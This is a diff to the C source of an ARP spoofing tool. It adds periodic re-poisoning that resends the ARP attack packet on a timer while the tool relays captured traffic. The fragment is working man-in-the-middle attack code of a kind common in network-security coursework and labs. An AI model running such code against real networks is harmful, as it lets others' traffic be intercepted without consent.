@@ -135,17 +135,26 @@ int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, str
     int32_t res;
     struct pcap_pkthdr* pheader;
     const u_char* packet;
+    time_t bef_time, now_time;
 
     if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != EXIT_SUCCESS){
         return EXIT_FAILURE;
     }
     LOG(LogFilePath, "poisoning\n");
+    time(&bef_time);
 
     while( (res = pcap_next_ex(handle, &pheader, &packet)) >= 0){
         /* time out */
         if(res == 0)
             continue;
-
+	
+	time(&now_time);
+	if(now_time - bef_time > POISON_INTERVAL){
+            if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != EXIT_SUCCESS){
+                return EXIT_FAILURE;
+            }
+	    bef_time = now_time;
+	}
         switch (CheckPacket(packet, SenderMac, LocalMac, LocalIP, SenderIP, TargetIP)){
             case 1: /* relay */
                 LOG(LogFilePath, "relay\n");
